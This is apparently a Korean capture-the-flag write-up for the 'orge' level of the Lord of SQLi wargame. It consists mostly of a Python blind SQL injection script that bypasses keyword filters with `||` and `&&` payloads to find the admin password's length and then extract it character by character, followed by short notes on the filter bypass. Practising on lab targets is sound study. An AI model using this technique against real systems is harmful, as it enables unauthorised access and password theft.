# Payload
```python
import requests
import time
import string
import sys

URL = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
CHARSET = string.digits + string.ascii_lowercase
MAX_LEN = 1000
COOKIES = {"PHPSESSID": "ql3tqlmum5mkma8kd3as04ppph"}

for i in range(1, MAX_LEN):
    payload = f"0' || id='admin' && length(pw)={i} -- '"
    payload.replace("&", "%26")
    r = requests.get(
        URL,
        params={"pw": payload},
        cookies=COOKIES
    )
    print(f"Trying length {i}...")
    if(r.text.count("Hello") >= 2):
        print(f"[Found] Password length is {i}")
        MAX_LEN = i
        break

def extract_password():
    found = ""
    for pos in range(1, MAX_LEN + 1):
        matched = False
        for ch in CHARSET:
            payload = f"0' || id='admin' && substr(pw,{pos},1)='{ch}' -- '"
            # payload = payload.replace("&", "%26")
            try:
                r = requests.get(URL, params={"pw": payload}, timeout=10, cookies=COOKIES)
                print(f"현재 시도중: payload = {payload}, pos={pos}, ch='{ch}'", end='\n', flush=True)
                print(f"Full URL: {r.url}", end='\n', flush=True)
            except Exception as e:
                print(f"요청 실패: {e}", file=sys.stderr)
                return False
            # "Hello"가 두 번 이상이면 조건이 참이라고 판단
            if r.text.count("Hello") >= 2:
                found += ch
                matched = True
                print(f"pos {pos}: {ch} (현재: {found})")
                break

        if not matched:
            print(f"문자 없음(pos={pos}). 비밀번호 추출 종료.")
            break
    return found

if __name__ == "__main__":
    print("시작: Blind SQLi 문자 추출")
    pwd = extract_password()
    print(f"추출된 비밀번호: {pwd}")
```
- 이번에도 `and`, `or` 키워드는 손쉽게 우회 가능하다.
- 다만 이번에는 정확한 비밀번호를 요구하기 때문에, blind sql을 해야 한다.
	- 방식은 동일하다.
	- python에서 & 기호는 그냥 넘겨도 잘 되는것 같다. 굳이 URL 인코딩 안 해도 되는듯
